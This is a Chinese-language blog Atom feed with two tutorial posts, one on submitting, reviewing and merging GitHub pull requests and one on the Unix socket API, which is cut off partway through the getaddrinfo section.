<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>清欢&#39;s Blog</title>
  
  <subtitle>一个杂乱的笔记本</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mingliangliu.com/"/>
  <updated>2020-02-15T06:45:50.763Z</updated>
  <id>https://mingliangliu.com/</id>
  
  <author>
    <name>清欢</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Github Pull Request的提出与采纳</title>
    <link href="https://mingliangliu.com/posts/c97c9d53/"/>
    <id>https://mingliangliu.com/posts/c97c9d53/</id>
    <published>2020-01-24T05:19:54.000Z</published>
    <updated>2020-02-15T06:45:50.763Z</updated>
    
    <content type="html"><![CDATA[<p>这一文来讲解一下Github Pull Request（以下简称PR）的使用方法：</p><ul><li>作为PR的提出者，如何对某个仓库提交PR，如何根据仓库管理者对所提交PR的反馈对PR进行完善</li><li>作为PR的接收者，如何对PR进行测试，对提出者进行反馈以及合并PR到仓库中。</li></ul><p>这里我使用两个GitHub账户来进行说明，PR接收者账户为lml256，PR提出者账户为rikkaii。并以lml256账户中的learngit仓库进行试验。</p><h2 id="如何提出PR"><a href="#如何提出PR" class="headerlink" title="如何提出PR"></a>如何提出PR</h2><p>如果你对Github上的某个开源项目非常感兴趣，想贡献自己的力量为其添加新功能，或者发现了代码中的一些bug，想为其进行修复。那么可以将该开源仓库Fork到你的仓库列表中，并对其进行修改后，向原仓库提交PR，请求仓库的管理员合并你的代码。下面假设我们的账号为rikkaii，并向lml256账号中的learngit项目提交PR为例，详细的说明一下该流程：</p><h3 id="Fork仓库"><a href="#Fork仓库" class="headerlink" title="Fork仓库"></a>Fork仓库</h3><p>Fork仓库非常简单，只需要到仓库首页的右上角点一下Fork按钮即可，Github会自动在你的仓库列表中创建该仓库的一个副本。</p><img src="/images/Github-Pull-Request的提出与采纳1.png"><p>如下图，GitHub自动在你的账户上创建了一个副本，并在仓库名的下方指明了该仓库是Fork来的：</p><img src="/images/Github-Pull-Request的提出与采纳2.png"><h3 id="添加新功能"><a href="#添加新功能" class="headerlink" title="添加新功能"></a>添加新功能</h3><p>现在我们为该仓库添加一些新功能：</p><p>首先将该仓库clone到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git@rikkaii:rikkaii/learngit.git</span><br><span class="line">Cloning into &apos;learngit&apos;...</span><br><span class="line">remote: Enumerating objects: 65, done.</span><br><span class="line">remote: Total 65 (delta 0), reused 0 (delta 0), pack-reused 65</span><br><span class="line">Receiving objects: 100% (65/65), 5.44 KiB | 928.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (17/17), done.</span><br></pre></td></tr></table></figure><p>我们从master分支上新建一个<strong>特性分支</strong>，并在特性分支上面实现我们的新功能。这里简要说明下什么是特性分支：在主流的git开发模式中并不会直接在master上开发，而是在开发某个功能时新建一个分支，叫做特性分支，在其上进行开发，等到开发完成并测试完成后，再合并到master分支中，然后删除该分支。并且特性分支的名称要简明扼要，方便别人明白其作用。这里我们创建一个<code>python-div</code>分支用于开发新功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b python-div</span><br><span class="line">Switched to a new branch &apos;python-div&apos;</span><br></pre></td></tr></table></figure><p>我们在目录中创建一个<code>div.py</code>文件并在其编写一些代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># div.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># div.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    ans = a / b</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>然后进行提交，并推送到GitHub：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ git add div.py</span><br><span class="line"></span><br><span class="line">$ git commit -m <span class="string">"add div.py"</span></span><br><span class="line">[python-div 7aad1de] add div.py</span><br><span class="line"> 1 file changed, 5 insertions(+)</span><br><span class="line"> create mode 100644 div.py</span><br><span class="line"></span><br><span class="line">$ git push --<span class="built_in">set</span>-upstream origin python-div</span><br><span class="line">...</span><br><span class="line">To rikkaii:rikkaii/learngit.git</span><br><span class="line"> * [new branch]      python-div -&gt; python-div</span><br><span class="line">Branch <span class="string">'python-div'</span> <span class="built_in">set</span> up to track remote branch <span class="string">'python-div'</span> from <span class="string">'origin'</span>.</span><br></pre></td></tr></table></figure><p>在上面的命令中，由于python-div分支是我们本地新建的，在GitHub远程仓库中并没有该分支的相关信息，为了能够将该分支的修改推送到GitHub远程仓库上，在推送时需要添加<code>--set-upstream</code>参数，这样会在远程仓库中也创建一个python-div分支，并将该分支的修改推送上去。</p><img src="/images/Github-Pull-Request的提出与采纳3.png"><p>可以看到，我们的仓库中已经有了python-div分支以及本次commit添加的div.py文件。</p><h3 id="发起PR"><a href="#发起PR" class="headerlink" title="发起PR"></a>发起PR</h3><p>接下来，你可以点击上图中分支名称旁边的的New pull Request按钮来发起一个PR。这会自动跳转到原仓库下面，并选择python-div作为要推送的分支，如下：</p><img src="/images/Github-Pull-Request的提出与采纳4.png"><p>至于要将python-div分支上的修改推送到原仓库的什么分支上，Github在这里自动为我们选择了master分支，这里需要注意的是分支的选择与原仓库使用的什么开发模式有关，一般正规的开源仓库都会说明PR的提交规则，包括提交到什么分支以及如何描述commit等等，这需要我们仔细阅读相关的要求并遵循。这里为了演示方便，将python-div分支的修改请求推送到原仓库的master上，并且在上图下面的说明栏里也只是使用GitHub的默认说明。</p><p>接下来便可以点击上图下面的Create pull request按钮来创建一个分支了。</p><img src="/images/Github-Pull-Request的提出与采纳5.png"><p>当出现上图的样子后，我们的PR就创建成功了。我们只需要静静等待仓库管理员的审核就行了。</p><h3 id="修正PR"><a href="#修正PR" class="headerlink" title="修正PR"></a>修正PR</h3><p>但是，有些事总是事与愿违，有时候我们认为我们的代码没有问题，但是却被仓库管理员反馈（或者被其他开发者指出）我们的代码有问题，需要我们修复。管理员通过对我们的代码进行审计后，指出了我们的错误，Github也会将管理员与我们之间及其他开发者之间（这里并没有其他开发者）对该次PR的讨论反映在了时间轴上，并会以邮件的形式通知我们：</p><img src="/images/Github-Pull-Request的提出与采纳11.png"><p>接下来，我们按照仓库管理员的要求，对代码进行完善，修改后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># div.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ans = a / b</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'error:'</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>修改完成后，对代码进行提交并推送到GitHub：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ git add div.py</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;fix zero division error&quot;</span><br><span class="line">[python-div c3b73e7] fix zero division error</span><br><span class="line"> 1 file changed, 5 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">$ git push</span><br><span class="line">...</span><br><span class="line">To rikkaii:rikkaii/learngit.git</span><br><span class="line">   7aad1de..c3b73e7  python-div -&gt; python-div</span><br></pre></td></tr></table></figure><p>当我们推送完后，无需再次发起PR，Github会自动的将该次的提交反映到原来PR时间轴上，如下图，并且Github还会向管理员发送邮件通知本次修改：</p><img src="/images/Github-Pull-Request的提出与采纳12.png"><p>当仓库管理者通过了本次代码，将我们的代码合并到了master分支中后，我们也会收到Github发来的关于Merge本次PR的邮件通知。</p><h2 id="接收PR"><a href="#接收PR" class="headerlink" title="接收PR"></a>接收PR</h2><p>说完了如何提交PR，我们再说一说如何接收PR。作为一个开源项目的管理者，学会如何测试别人提出的PR并进行反馈或者合并是很必要的。这里假设我们的账号为lml256，以接收rikkaii账号向lml256账号中的learngit仓库提交的PR为例，详细的说明一下作为仓库的管理者，如何测试和合并PR。</p><h3 id="审计PR"><a href="#审计PR" class="headerlink" title="审计PR"></a>审计PR</h3><p>打开我们的仓库，在Pull Requests列表中可以看到rikkaii向我们的仓库提交了一个PR</p><img src="/images/Github-Pull-Request的提出与采纳6.png"><p>点进去可以看到详细的信息：</p><img src="/images/Github-Pull-Request的提出与采纳7.png"><p>我们可以在Files changed栏里对代码进行审计，如果代码有问题的话，可以对每行代码添加批注，以帮助PR提交者进行完善，写完批注后，点击start a review便可发起一个code review。如下：</p><img src="/images/Github-Pull-Request的提出与采纳8.png"><p>当代码全部都审计完后，点击下图中的submit review便可以提交本次的审计结果。</p><img src="/images/Github-Pull-Request的提出与采纳9.png"><p>提交后，我们对代码的审计结果便会反映在该PR的时间轴上，并且GitHub会向PR发起者发送回复通知邮件。</p><img src="/images/Github-Pull-Request的提出与采纳10.png"><h3 id="对PR进行本地测试"><a href="#对PR进行本地测试" class="headerlink" title="对PR进行本地测试"></a>对PR进行本地测试</h3><p>只在Github上凭借眼睛看并不能发现所有的问题，在对PR正式合并前，我们还需要对PR进行本地测试，如何使用git进行操作如下图：</p><img src="/images/Github-Pull-Request的提出与采纳14.png"><p>首先我们需要将我们仓库的代码clone到本地（也可能不需要clone，如果本地已经有该仓库的话），然后拉取PR发起者仓库的相关信息，这需要我们先将PR发起者Fork的仓库添加到本地仓库的远程仓库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add PR_Sponsor git@rikkaii:rikkaii/learngit.git</span><br><span class="line"></span><br><span class="line">$ git fetch PR_Sponsor  # 获取PR发起者仓库的相关信息</span><br><span class="line">...</span><br><span class="line">From rikkaii:rikkaii/learngit</span><br><span class="line"> * [new branch]      dev        -&gt; PR_Sponsor/dev</span><br><span class="line"> * [new branch]      master     -&gt; PR_Sponsor/master</span><br><span class="line"> * [new branch]      python-div -&gt; PR_Sponsor/python-div</span><br></pre></td></tr></table></figure><p>可以看到，我们从PR发起者仓库中获取到三个分支，其中包括为我们提交PR的python-div分支。</p><p>在进行测试之前，我们还需要创建一个特性分支用于测试PR，并将python-div分支的修改merge到特性分支上进行测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b test_pr</span><br><span class="line">Switched to a new branch &apos;test_pr&apos;</span><br><span class="line"></span><br><span class="line">$ git merge PR_Sponsor/python-div</span><br><span class="line">Updating 9053d5b..c3b73e7</span><br><span class="line">Fast-forward</span><br><span class="line"> div.py | 9 +++++++++</span><br><span class="line"> 1 file changed, 9 insertions(+)</span><br><span class="line"> create mode 100644 div.py</span><br></pre></td></tr></table></figure><h3 id="Merge代码"><a href="#Merge代码" class="headerlink" title="Merge代码"></a>Merge代码</h3><p>经过一番测试后，我们确信该PR的代码没有问题，可以合并代码到PR发起者要求合并到的分支上（这里是master）。这里有两种方法来处理这个问题，一是直接使用GitHub提供的Merge按钮，这种方法比较直观方便，但是不够灵活，无法处理合并冲突；二是在本地将测试后的特性分支合并到要合并的分支上，然后手动提交。尽管第二种方式处理起来比较复杂，但是却比较灵活，可以处理Github不能胜任的地方。这里我们选择第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br><span class="line">Your branch is up to date with &apos;origin/master&apos;.</span><br><span class="line"></span><br><span class="line">$ git merge test_pr</span><br><span class="line">Updating 9053d5b..c3b73e7</span><br><span class="line">Fast-forward</span><br><span class="line"> div.py | 9 +++++++++</span><br><span class="line"> 1 file changed, 9 insertions(+)</span><br><span class="line"> create mode 100644 div.py</span><br><span class="line"></span><br><span class="line">$ git branch -d test_pr   # 这里我们的特性分支已没作用，可以删除</span><br><span class="line">Deleted branch test_pr (was c3b73e7).</span><br><span class="line"></span><br><span class="line">$ git push</span><br><span class="line">...</span><br><span class="line">To lml256:lml256/learngit.git</span><br><span class="line">   9053d5b..c3b73e7  master -&gt; master</span><br></pre></td></tr></table></figure><p>这里，我们已经处理完了该PR，同时，GitHub也会检测到我们合并了该PR，也将其反映到该PR的时间轴上，并将该PR的状态设置为Merged状态，关闭该次PR：</p><img src="/images/Github-Pull-Request的提出与采纳13.png"><hr><p>完</p><p>版权所有，未经允许不得转载</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这一文来讲解一下Github Pull Request（以下简称PR）的使用方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作为PR的提出者，如何对某个仓库提交PR，如何根据仓库管理者对所提交PR的反馈对PR进行完善&lt;/li&gt;
&lt;li&gt;作为PR的接收者，如何对PR进行测试，对提出者进行反
      
    
    </summary>
    
      <category term="git" scheme="https://mingliangliu.com/categories/git/"/>
    
    
      <category term="git" scheme="https://mingliangliu.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Unix套接字接口</title>
    <link href="https://mingliangliu.com/posts/28c7bd33/"/>
    <id>https://mingliangliu.com/posts/28c7bd33/</id>
    <published>2019-11-20T09:40:22.000Z</published>
    <updated>2020-02-15T06:45:50.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>套接字是操作系统中用于网络通信的重要结构，它是建立在网络体系结构的传输层，用于主机之间数据的发送和接收，像web中使用的http协议便是建立在socket之上的。这一节主要讨论网络套接字。</p><p>套接字接口时一组函数，它们和Unix I/O结合起来，用于创建网络应用。许多操作系统都实现了自己的套接字接口。在Unix中，可以将套接字视为一个文件，使用文件I/O函数对套接字进行操作，这也贯彻了Unix中一切皆文件的思想。</p><p>既然是网络通信，那么就需要服务端和客户端，一个基本的客户端和服务端的通信模型如下，其中方框里为使用的函数接口：</p><img src="/images/Unix套接字接口.png"><p>由于套接字本质上也是一个文件，所以上图中的<code>recv</code>和<code>send</code>也可以使用文件I/O函数<code>read</code>和<code>write</code>替代。</p><h2 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h2><p>既然要进行网络通信，那么就要有基本的网络的地址。因特网的套接字地址存放在一个叫<code>sockaddr_in</code>的16字节的结构体中，其中的IP地址和端口号都是以网络字节序（大端序）存放的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>        sin_family;     <span class="comment">/* 协议类型，总是AF_INET */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>        sin_port;       <span class="comment">/* 端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  <span class="title">sin_addr</span>;</span>       <span class="comment">/* IP地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   sin_zero[<span class="number">8</span>];    <span class="comment">/* sizeof(struct in_addr) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin_family;         <span class="comment">/* 协议类型 */</span></span><br><span class="line">    <span class="keyword">char</span>        sa_data[<span class="number">14</span>];        <span class="comment">/* 地址信息 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到，上面还有一个<code>sockaddr</code>结构体类型。由于<code>connect</code>、<code>bind</code>和<code>accept</code>都需要接受一个指向与协议相关的套接字地址结构指针。但是在设计这些接口时，如何定义这些接口，使之能够接受各种类型的套接字地址。为了解决这个问题，设计了<code>sockaddr</code>这种通用的结构体，在使用这些接口时，都需要将与协议相关的结构体转化为这个通用的结构体。</p><h2 id="创建和关闭套接字"><a href="#创建和关闭套接字" class="headerlink" title="创建和关闭套接字"></a>创建和关闭套接字</h2><p>使用<code>socket</code>函数创建一个套接字，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功则为非负描述符，失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>参数<code>domain</code>（域）用于确定通讯的特性，具体如下：</p><table><thead><tr><th>域</th><th>描述</th></tr></thead><tbody><tr><td>AF_INET</td><td>IPv4因特网域</td></tr><tr><td>AF_INET6</td><td>IPv6因特网域</td></tr><tr><td>AF_UNIX</td><td>UNIX域</td></tr><tr><td>AF_UPSPEC</td><td>未指定</td></tr></tbody></table><p>参数<code>type</code>确定套接字的类型，进一步确定通讯特性：</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>SOCK_DGRAM</td><td>固定长度的，无连接的，不可靠的报文传递</td></tr><tr><td>SOCK_RAW</td><td>IP协议的数据报接口</td></tr><tr><td>SOCK_SEQPACKET</td><td>固定长度的，有序的，可靠的，面向连接的报文协议</td></tr><tr><td>SOCK_STREAM</td><td>有序的，可靠的，双向的，面向连接的字节流（TCP）</td></tr></tbody></table><p>参数<code>protocol</code>通常是0，表示使用默认协议，其他选项这里不再赘述。</p><p>例如可以像下面这样创建一个套接字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>其中，<code>AF_INET</code>表示我们使用32位IPv4地址，<code>SOCK_STREAM</code>表示我们使用TCP协议。但是最好的方法使用<code>getaddrinfo</code>函数来自动生成这些函数，这样我们的代码就与具体的协议无关了。我们会在下方进行讲述。</p><p><code>socket</code>函数返回的描述符只是部分打开的，还不能直接使用，取决于是作为客户端还是服务端，需要一些初始化工作。</p><p><code>shutdown</code>可以用来禁止一个套接字的I/O：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功返回1，若出错返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shutdown</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> how)</span></span>;</span><br></pre></td></tr></table></figure><p>参数<code>how</code>指明了关闭套接字的方式：</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>SHUT_RD</td><td>关闭读端</td></tr><tr><td>SHUT_WR</td><td>关闭写端</td></tr><tr><td>SHUT_RDWR</td><td>关闭读写</td></tr></tbody></table><p>尽管使用<code>close</code>函数也够关闭套接字，但是和<code>shutdown</code>函数却有两点不同：当对一个套接字描述符调用<code>close</code>，该套接字的引用计数会减一，只有当引用计数为0时才会真正关闭套接字，而<code>shutdown</code>不管引用计数是否为0，都会关闭套接字。另外，<code>shutdown</code>可以只关闭套接字读写两个方向中的一个方向，保留另一个方向继续工作。</p><h2 id="绑定地址"><a href="#绑定地址" class="headerlink" title="绑定地址"></a>绑定地址</h2><p>作为服务器，需要给套接字关联一个众所周知的地址，这样别人才能使用这个地址来对服务器进行访问。</p><p>使用<code>bind</code>函数来关联地址和套接字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功，返回0，出错，返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure><p><code>bind</code>函数将告诉内核将<code>addr</code>中的服务器套接字地址和套接字<code>sockfd</code>关联起来。其中<code>len</code>为<code>sizeof(sockaddr_in)</code>。</p><p>对于使用的服务器地址有如下限制：</p><ul><li>指定的地址必须有效，不能是其他机器的地址</li><li>地址必须和创建套接字时的地址族所支持的格式相匹配</li><li>地址中的端口号必须不小于1024，除非该进程有相应特权</li><li>一般只能将一个套接字端点绑定到一个地址。</li></ul><h2 id="建立监听"><a href="#建立监听" class="headerlink" title="建立监听"></a>建立监听</h2><p>作为服务器，为了接受用户的连接，需要监听某个特定的端口。当客户请求连接这个端口时，便创建一个连接。</p><p>默认情况下，内核会认为<code>socket</code>函数创建的套接字为<strong>主动套接字</strong>，它存在于用于连接的客户端。调用<code>listen</code>函数来告诉内核描述符是被服务器所使用的，而不是客户端。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：成功返回0，失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br></pre></td></tr></table></figure><p><code>listen</code>函数将一个主动套接字转化为一个<strong>监听套接字</strong>，该套接字可以接受来自客户端的连接请求。<code>backlog</code>参数指明请求队列中未完成连接的数量。当队列已满，进程将拒绝后续的连接请求。</p><h2 id="等待连接"><a href="#等待连接" class="headerlink" title="等待连接"></a>等待连接</h2><p>一但服务器调用了<code>listen</code>，所用的套接字就可以用来接受连接请求，使用<code>accept</code>函数来接受客户端的连接请求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功，返回非负连接描述符，失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *<span class="keyword">restrict</span> addr, <span class="keyword">socklen_t</span> *<span class="keyword">restrict</span> len)</span></span>;</span><br></pre></td></tr></table></figure><p><code>accept</code>返回的描述符是一个新的<strong>已连接的描述符</strong>，这个套接字描述符用来和客户端进行通信。这个新的套接字和原始套接字（<code>sockfd</code>）具有相同的套接字类型和地址族，传送给<code>accept</code>的原始套接字并没有关联到这个连接，继续可用并接受其他连接。</p><p><code>accept</code>函数会将客户端的地址信息填充到参数<code>addr</code>指向的缓冲区，参数<code>len</code>为缓冲区的大小。如果不需要这些信息。可以将<code>addr</code>和<code>len</code>设为NULL。</p><p>如果没有连接请求，<code>accept</code>会阻塞到一个连接请求的到来。如果<code>sockfd</code>处于非阻塞模式，则返回-1，并将<code>errno</code>设置为<code>EAGAIN</code>或<code>EWOULDBLOCK</code>。</p><h2 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h2><p>对于客户端来说，如果要处理一个面向连接的网络服务（<code>SOCK_STREAM</code>或<code>SOCK_SEQPACKET</code>）。在交换数据之前，首先要在客户端和服务端之间建立一个连接。</p><p>使用<code>connect</code>函数来建立一个连接：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：成功返回0，出错误返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure><p><code>connect</code>函数会试图与套接字地址为<code>addr</code>的服务器建立一个连接，其中<code>len</code>为<code>sizeof(sockaddr_in)</code>。<code>connect</code>函数会阻塞，直到完成连接的建立或出错。随后，描述符<code>sockfd</code>便可进行读写了。</p><h2 id="发送和接收"><a href="#发送和接收" class="headerlink" title="发送和接收"></a>发送和接收</h2><p>可以使用<code>send</code>函数来发送数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：若成功，返回发送的字节数，若出错，返回-1 */</span></span><br><span class="line"><span class="keyword">ssize_t</span> send(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes, <span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure><p><code>send</code>函数与用于文件读写的<code>write</code>函数基本一致，只是多了第四个参数<code>flags</code>，一般置为0。</p><p>使用<code>recv</code>来接收数据:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回：返回数据的字节长度，若无可用数据或对方已经按序结束，返回0，若出错返回-1 */</span></span><br><span class="line"><span class="keyword">ssize_t</span> recv(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes, <span class="keyword">int</span> flags);</span><br></pre></td></tr></table></figure><p><code>recv</code>函数与<code>read</code>函数基本一致，只是多了第四个参数<code>flags</code>，来管理如何接收数据，一般置为0。</p><h2 id="主机和服务的转换"><a href="#主机和服务的转换" class="headerlink" title="主机和服务的转换"></a>主机和服务的转换</h2><p>在前面对套接字的创建中，我们采用手动指明协议的方式，但是这样编写并不恰当。Linux提供了一些函数用于主机名和服务名与地址之间的相互映射，使用这些函数可以使我们的程序独立于任何特定版本的IP协议。下面看一下这些函数。</p><p><code>getaddrinfo</code>函数用于将主机名，主机地址，服务名和端口号的字符串表示转化为套接字地址结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 